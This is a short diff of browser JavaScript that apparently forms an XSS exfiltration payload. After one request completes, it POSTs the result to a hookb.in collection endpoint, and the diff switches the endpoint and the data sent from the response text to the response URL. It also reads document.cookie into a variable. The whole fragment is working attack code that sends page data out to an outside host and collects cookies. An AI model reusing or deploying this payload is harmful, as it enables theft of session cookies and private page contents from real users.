@@ -4,9 +4,9 @@ http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 http.onload = function () {
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://hookb.in/xYw6qX1paJU0nNxxjZaN', true);
+                xhr.open('POST', 'https://hookb.in/K3NZPpngRDhPMK882dJR', true);
                 xhr.setRequestHeader('Content-type', 'application/json');
-                xhr.send(JSON.stringify(http.responseText));
+                xhr.send(JSON.stringify(http.responseURL));
 
 };
 const cook = document.cookie;
